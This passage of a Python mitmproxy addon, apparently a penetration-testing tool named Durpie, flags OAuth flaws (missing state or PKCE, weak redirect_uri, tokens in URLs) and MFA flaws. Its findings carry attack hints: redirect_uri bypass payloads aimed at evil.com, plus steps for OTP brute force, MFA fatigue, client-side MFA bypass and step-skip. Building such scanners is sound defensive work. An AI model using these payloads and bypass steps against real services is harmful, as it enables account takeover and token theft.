        "double_slash": "https://legitimate.com//evil.com/callback",
        "backslash": "https://legitimate.com\\@evil.com/callback",
        "null_byte": "https://legitimate.com%00.evil.com/callback",
        "localhost": "http://localhost/callback",
        "parameter_pollution": "https://legitimate.com/callback&redirect_uri=https://evil.com",
    }

    def __init__(self):
        self.findings: List[Finding] = []
        self._oauth_flows: Dict[str, Dict] = {}   # state → flow info
        self._auth_endpoints: set = set()

    def _log(self, msg: str):
        _mitmlog("OAuth", msg)

    def _warn(self, msg: str):
        _mitmlog("OAuth", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def _is_oauth_request(self, url: str, body: str) -> bool:
        """Detect OAuth-related requests."""
        return any([
            "response_type=code" in url,
            "grant_type=" in url or "grant_type=" in body,
            "client_id=" in url,
            "redirect_uri=" in url,
            "authorization_code" in body,
            any(ep in url.lower() for ep in self.OAUTH_ENDPOINTS),
        ])

    def _extract_oauth_params(self, url: str) -> Dict[str, str]:
        """Extract OAuth parameters from a URL."""
        parsed = urllib.parse.urlparse(url)
        return dict(urllib.parse.parse_qsl(parsed.query))

    def request(self, flow: "http.HTTPFlow"):
        """Intercept OAuth authorization requests."""
        url = flow.request.pretty_url
        body = flow.request.get_text()

        if not self._is_oauth_request(url, body):
            return

        self._log(f"OAuth request detected: {url[:80]}")
        params = self._extract_oauth_params(url)

        # --- State parameter check ---
        state = params.get("state", "")
        if not state:
            self._add(Finding(
                type="OAuth Missing state Parameter",
                severity="HIGH",
                url=url,
                detail=(
                    "OAuth authorization request has no `state` parameter. "
                    "The state parameter prevents CSRF attacks against the OAuth flow. "
                    "An attacker can initiate an authorization on behalf of the victim, "
                    "then trick the victim into completing it (CSRF login)."
                ),
            ))
        elif len(state) < 16 or self.shannon_entropy(state) < 3.0:
            self._add(Finding(
                type="OAuth Weak state Parameter",
                severity="MEDIUM",
                url=url,
                detail=(
                    f"OAuth `state` parameter is weak: {state!r}. "
                    f"State must be unguessable (≥128 bits of entropy). "
                    f"Weak state enables CSRF against the OAuth callback."
                ),
                evidence=f"state={state}",
            ))
        else:
            # Track state for callback validation
            self._oauth_flows[state] = {
                "url": url,
                "params": params,
                "ts": time.time(),
            }

        # --- PKCE check ---
        if "code_challenge" not in params and params.get("response_type") == "code":
            self._add(Finding(
                type="OAuth Missing PKCE",
                severity="MEDIUM",
                url=url,
                detail=(
                    "Authorization request lacks PKCE (code_challenge). "
                    "Without PKCE, a malicious app that intercepts the authorization "
                    "code can exchange it for tokens (auth code interception attack). "
                    "PKCE is required for public clients (SPAs, mobile apps)."
                ),
            ))

        # --- Redirect URI analysis ---
        redirect_uri = params.get("redirect_uri", "")
        if redirect_uri:
            self._analyze_redirect_uri(redirect_uri, url)

        # --- Scope analysis ---
        scope = params.get("scope", "")
        if scope:
            self._analyze_scope(scope, url)

    def _analyze_redirect_uri(self, redirect_uri: str, auth_url: str):
        """Check for redirect_uri weaknesses."""
        decoded = urllib.parse.unquote(redirect_uri)
        parsed = urllib.parse.urlparse(decoded)

        # HTTP redirect_uri in production
        if parsed.scheme == "http" and parsed.hostname not in ("localhost", "127.0.0.1"):
            self._add(Finding(
                type="OAuth Insecure redirect_uri (HTTP)",
                severity="HIGH",
                url=auth_url,
                detail=(
                    f"redirect_uri uses HTTP: {redirect_uri!r}. "
                    "The authorization code will be sent over an unencrypted connection, "
                    "enabling interception by a network attacker."
                ),
                evidence=redirect_uri,
            ))

        # Wildcard or overly broad matching hints
        if "*" in redirect_uri or redirect_uri.endswith("/"):
            self._add(Finding(
                type="OAuth Potentially Broad redirect_uri",
                severity="LOW",
                url=auth_url,
                detail=(
                    f"redirect_uri may be too broad: {redirect_uri!r}. "
                    "IdPs should perform exact URI matching, not prefix or wildcard matching."
                ),
                evidence=redirect_uri,
            ))

        # Suggest redirect URI bypass test cases for manual testing
        self._add(Finding(
            type="OAuth redirect_uri - Manual Bypass Testing Required",
            severity="INFO",
            url=auth_url,
            detail=(
                f"Test redirect_uri validation by trying these bypasses against "
                f"the legitimate URI {redirect_uri!r}. Replace the redirect_uri "
                f"parameter with each variant and check if the code is issued."
            ),
            poc=(
                "# redirect_uri bypass payloads to test manually:\n" +
                "\n".join(f"  {k}: {v}" for k, v in self.REDIRECT_URI_ATTACKS.items())
            ),
        ))

    def _analyze_scope(self, scope: str, url: str):
        """Check for overly broad or sensitive scopes."""
        dangerous_scopes = {
            "openid email profile": "Exposes user PII",
            "offline_access": "Grants indefinite access via refresh tokens",
            "admin": "Administrative access",
            "write": "Write access to user data",
            "delete": "Destructive access",
            ".*": "Wildcard scope",
            "*": "Wildcard scope",
        }
        for ds, reason in dangerous_scopes.items():
            if ds.lower() in scope.lower():
                self._add(Finding(
                    type="OAuth Sensitive Scope Requested",
                    severity="LOW",
                    url=url,
                    detail=(
                        f"Scope includes '{ds}': {reason}. "
                        "Applications should request only the minimum scopes needed "
                        "(principle of least privilege)."
                    ),
                    evidence=f"scope={scope}",
                ))

    def response(self, flow: "http.HTTPFlow"):
        """Look for tokens leaked into response URLs and headers."""
        if not flow.response:
            return

        url = flow.request.pretty_url

        # Tokens in Location header redirect
        location = flow.response.headers.get("location", "")
        if location:
            self._check_token_in_url(location, url, "Location redirect")

        # Token in response body URLs
        body = flow.response.get_text()
        if body:
            url_pattern = re.compile(r'https?://[^\s\'"<>]+(?:access_token|id_token|code)=[^\s\'"<>&]+')
            for match in url_pattern.finditer(body):
                self._add(Finding(
                    type="OAuth Token Leaked in Response Body URL",
                    severity="HIGH",
                    url=url,
                    detail=(
                        "OAuth token or authorization code appears in a URL within "
                        "the response body. Tokens in URLs are logged by servers and "
                        "browsers, and leaked via Referer headers."
                    ),
                    evidence=match.group(0)[:100],
                ))

    def _check_token_in_url(self, location: str, source_url: str, context: str):
        """Check if a URL contains embedded OAuth tokens."""
        token_params = ["access_token", "id_token", "token", "code"]
        parsed = urllib.parse.urlparse(location)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        fragment = dict(urllib.parse.parse_qsl(parsed.fragment))

        for param in token_params:
            if param in qs:
                self._add(Finding(
                    type=f"OAuth Token in URL ({context})",
                    severity="HIGH",
                    url=source_url,
                    detail=(
                        f"OAuth '{param}' appears as a query parameter in {context}: "
                        f"{location[:80]}. "
                        "Query parameters are logged and leaked via Referer. "
                        "Tokens should only appear in URL fragments (#) or POST bodies."
                    ),
                    evidence=f"{param}={qs[param][:30]}...",
                ))
            if param in fragment:
                # Fragment is slightly better (not sent to server) but still in history
                self._add(Finding(
                    type=f"OAuth Token in URL Fragment ({context})",
                    severity="LOW",
                    url=source_url,
                    detail=(
                        f"OAuth '{param}' is in the URL fragment of {context}. "
                        "While fragments aren't sent to the server, they're visible "
                        "in browser history and can be accessed by JavaScript."
                    ),
                    evidence=f"#{param}={fragment[param][:30]}...",
                ))

    @staticmethod
    def shannon_entropy(s: str) -> float:
        if not s:
            return 0.0
        counts = Counter(s)
        n = len(s)
        return -sum((c / n) * math.log2(c / n) for c in counts.values())


# ============================================================
# MFA TESTER
# ============================================================

class MFATester:
    """
    Multi-Factor Authentication security tester.

    Tests:
        1. OTP rate limiting  - Can we submit many OTP guesses without being blocked?
                               6-digit TOTP has 1,000,000 combinations → must be rate limited.
        2. Empty/null OTP    - Does the server accept an empty or null OTP?
        3. OTP reuse         - Can a used OTP be replayed?
        4. MFA fatigue       - Are push notification endpoints identifiable?
                               MFA fatigue: spam push approvals to tire the user.
        5. Backup code entropy - Are backup codes sufficiently random?
        6. Response manipulation - Does the MFA check happen client-side?
        7. Step-skip         - Can the MFA step be skipped by going directly to /dashboard?
    """

    # Patterns that suggest an OTP submission endpoint
    OTP_PATTERNS = [
        r"/mfa", r"/2fa", r"/otp", r"/totp", r"/verify",
        r"/confirm", r"/authenticate", r"/challenge",
    ]
    OTP_BODY_PATTERNS = [
        r'"otp"', r'"code"', r'"token"', r'"passcode"',
        r"otp=", r"code=", r"totp_code=", r"mfa_code=",
    ]

    def __init__(self):
        self.findings: List[Finding] = []
        self._otp_endpoints: Dict[str, Dict] = {}   # url → {method, headers, body_template}
        self._otp_attempt_counts: Dict[str, int] = {}
        self._step_urls: List[str] = []  # ordered list of seen auth step URLs

    def _log(self, msg: str):
        _mitmlog("MFA", msg)

    def _warn(self, msg: str):
        _mitmlog("MFA", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def _is_otp_endpoint(self, url: str, body: str) -> bool:
        url_lower = url.lower()
        if any(re.search(p, url_lower) for p in self.OTP_PATTERNS):
            return True
        if body and any(re.search(p, body, re.IGNORECASE) for p in self.OTP_BODY_PATTERNS):
            return True
        return False

    def _is_push_endpoint(self, url: str, body: str) -> bool:
        indicators = ["push", "duo", "authy", "approve", "notification", "okta"]
        url_lower = url.lower()
        return any(ind in url_lower for ind in indicators)

    def request(self, flow: "http.HTTPFlow"):
        """Intercept MFA-related requests."""
        url = flow.request.pretty_url
        body = flow.request.get_text()

        # Track ordered auth steps for step-skip detection
        if any(kw in url.lower() for kw in ["/login", "/verify", "/mfa", "/2fa", "/dashboard"]):
            self._step_urls.append(url)

        if not self._is_otp_endpoint(url, body):
            return

        self._log(f"MFA/OTP endpoint detected: {url}")

        # Track for rate limit testing
        if url not in self._otp_endpoints:
            self._otp_endpoints[url] = {
                "method": flow.request.method,
                "headers": dict(flow.request.headers),
                "body": body,
            }

        # Count attempts on same endpoint
        self._otp_attempt_counts[url] = self._otp_attempt_counts.get(url, 0) + 1

        # Push notification MFA fatigue
        if self._is_push_endpoint(url, body):
            self._add(Finding(
                type="MFA Push Notification Endpoint Identified",
                severity="INFO",
                url=url,
                detail=(
                    "This appears to be a push-notification MFA endpoint. "
                    "MFA fatigue attack: repeatedly trigger push notifications "
                    "until the user approves one out of frustration. "
                    "Test whether the server rate-limits push requests per user."
                ),
                poc=(
                    "# MFA fatigue test (requires valid credentials + account):\n"
                    "# Send repeated POST requests to trigger push notifications\n"
                    "# If the server allows unlimited pushes, fatigue attack is possible\n"
                    f"# Endpoint: {url}"
                ),
            ))

    def response(self, flow: "http.HTTPFlow"):
        """Analyze MFA responses for security issues."""
        if not flow.response:
            return

        url = flow.request.pretty_url
        body = flow.request.get_text()
        resp_body = flow.response.get_text()
        status = flow.response.status_code

        if not self._is_otp_endpoint(url, body):
            return

        # Rate limit detection: if no 429/lockout after multiple attempts, it's not rate limited
        attempt_count = self._otp_attempt_counts.get(url, 0)
        if attempt_count >= 5 and status not in [429, 423, 403]:
            self._add(Finding(
                type="MFA Missing Rate Limiting",
                severity="HIGH",
                url=url,
                detail=(
                    f"OTP endpoint received {attempt_count} attempts without "
                    f"returning 429 Too Many Requests or locking the account. "
                    f"A 6-digit TOTP can be brute-forced in ~16 minutes at 1 req/sec. "
                    f"Without rate limiting, automated OTP guessing is feasible."
                ),
                poc=(
                    "# OTP brute force test (authorized testing only):\n"
                    "# A 6-digit OTP has 10^6 = 1,000,000 combinations\n"
                    "# TOTP window is typically 30s; valid codes ≈ 2 at any time\n"
                    f"# Test endpoint: {url}\n"
                    "# Try codes: 000000 through 999999 with delay to avoid timing issues"
                ),
            ))

        # Client-side MFA bypass: MFA result in response body that might be checked in JS
        mfa_bypass_indicators = [
            (r'"mfa_passed"\s*:\s*false', "mfa_passed: false → try modifying to true"),
            (r'"verified"\s*:\s*false', "verified: false → try modifying to true"),
            (r'"success"\s*:\s*false', "success: false → try modifying to true"),
            (r'"step"\s*:\s*"mfa"', "step=mfa → try bypassing to next step"),
        ]
        for pattern, hint in mfa_bypass_indicators:
            if re.search(pattern, resp_body, re.IGNORECASE):
                self._add(Finding(
                    type="MFA Potential Client-Side Bypass",
                    severity="HIGH",
                    url=url,
                    detail=(
                        f"Response contains MFA status in JSON that may be client-side validated: "
                        f"{hint}. Intercept and modify the response to bypass MFA."
                    ),
                    evidence=pattern,
                    poc=(
                        "# Client-side MFA bypass:\n"
                        "# 1. Intercept the MFA verification response in the proxy\n"
                        f"# 2. Find pattern: {pattern}\n"
                        "# 3. Change false → true in the response\n"
                        "# 4. If the app proceeds past MFA, it's client-side only"
                    ),
                ))

        # Check for backup codes in response (entropy analysis)
        backup_pattern = re.findall(
            r"\b([A-Z0-9]{4,6}[-\s]?[A-Z0-9]{4,6})\b", resp_body
        )
        if backup_pattern and ("/mfa" in url.lower() or "/backup" in url.lower()):
            for code in backup_pattern[:3]:
                entropy = SessionAnalyzer.shannon_entropy(code.replace("-", "").replace(" ", ""))
                if entropy < 3.0:
                    self._add(Finding(
                        type="Low-Entropy MFA Backup Code",
                        severity="MEDIUM",
                        url=url,
                        detail=(
                            f"Backup code {code!r} has low entropy ({entropy:.2f} bits/char). "
                            "Backup codes should be cryptographically random."
                        ),
                        evidence=code,
                    ))

        # Step-skip advisory: if /dashboard appears before MFA was completed
        if len(self._step_urls) >= 2:
            has_mfa = any("/mfa" in u.lower() or "/2fa" in u.lower()
                         for u in self._step_urls)
            has_dashboard = any("/dashboard" in u.lower() or "/home" in u.lower()
                               for u in self._step_urls)
            if has_dashboard and not has_mfa:
                self._add(Finding(
                    type="MFA Step-Skip Possible",
                    severity="HIGH",
                    url=url,
                    detail=(
                        "Dashboard/home was accessed without going through an MFA step. "
                        "After entering credentials, try navigating directly to "
                        "/dashboard, /account, or /home before completing MFA. "
                        "Server should validate MFA completion server-side, not rely "
                        "on redirect flow alone."
                    ),
                    poc=(
                        "# MFA step-skip test:\n"
                        "# 1. Submit username/password (do NOT complete MFA)\n"
                        "# 2. In a new tab (same session cookie), navigate directly to:\n"
                        "#    /dashboard, /account/profile, /admin, etc.\n"
                        "# 3. If accessible, MFA is bypassable by direct navigation"
                    ),
                ))


# ============================================================
# COMBINED ADDON
# ============================================================

class AuthTestingSuite:
    """
    Combined Phase 3 authentication testing suite.

    Runs all auth/session scanners as a single mitmproxy addon:
    - JWTDeepAnalyzer
    - SessionAnalyzer
    - OAuthOIDCTester
    - MFATester

    Usage:
        mitmdump -s auth_testing.py
    """

    def __init__(self):
        self.jwt = JWTDeepAnalyzer()
        self.session = SessionAnalyzer()
        self.oauth = OAuthOIDCTester()
        self.mfa = MFATester()
        self._all_findings: List[Finding] = []

    def running(self):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info("[AuthTesting] Phase 3 auth scanners initialized")
            ctx.log.info("[AuthTesting] JWT deep analysis + Session + OAuth/OIDC + MFA")

    def request(self, flow: "http.HTTPFlow"):
        self.jwt.request(flow)
        self.session.request(flow)
        self.oauth.request(flow)
        self.mfa.request(flow)

    def response(self, flow: "http.HTTPFlow"):
        self.session.response(flow)
        self.oauth.response(flow)
        self.mfa.response(flow)

    def done(self):
        all_findings = (
            self.jwt.findings +
            self.session.findings +
            self.oauth.findings +
            self.mfa.findings
        )
        if not all_findings:
            return

        output = [f.to_dict() for f in all_findings]
        filename = f"durpie_auth_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, "w") as fh:
                json.dump(output, fh, indent=2)
            msg = f"[AuthTesting] {len(output)} findings saved to {filename}"
            if MITMPROXY_AVAILABLE and ctx:
                ctx.log.info(msg)
            else:
                print(msg)
        except OSError as e:
            print(f"[AuthTesting] Failed to save findings: {e}")


# ============================================================
# MITMPROXY ADDONS LIST
# ============================================================

addons = [
    AuthTestingSuite(),
]


# ============================================================
# STANDALONE DEMO
# ============================================================

if __name__ == "__main__":
    import sys

    print("""
Durpie v2 - Authentication & Session Testing (Phase 3)
=======================================================
Modules:
  - JWTDeepAnalyzer  : alg:none, RS256→HS256 confusion, JWK injection,
                       kid SQLi/traversal, secret brute force, claim manipulation
  - SessionAnalyzer  : Entropy analysis, fixation, logout invalidation,
                       cookie security, session-in-URL
  - OAuthOIDCTester  : redirect_uri bypass, state/PKCE checks,
                       scope analysis, token leakage
  - MFATester        : Rate limit, client-side bypass, step-skip,
                       backup code entropy, MFA fatigue

Usage as mitmproxy addon:
  mitmdump -s auth_testing.py

Analyze a specific JWT:
  python auth_testing.py <jwt_token> [url]
""")

    if len(sys.argv) > 1:
        token_arg = sys.argv[1]
        url_arg = sys.argv[2] if len(sys.argv) > 2 else "https://example.com"

        analyzer = JWTDeepAnalyzer()
        findings = analyzer.analyze_token(token_arg, url_arg)
        print(f"[*] JWT Analysis: {len(findings)} findings\n")
        for f in findings:
            print(f"  {f}")
            if f.poc:
                print(f"  PoC:\n{f.poc}\n")
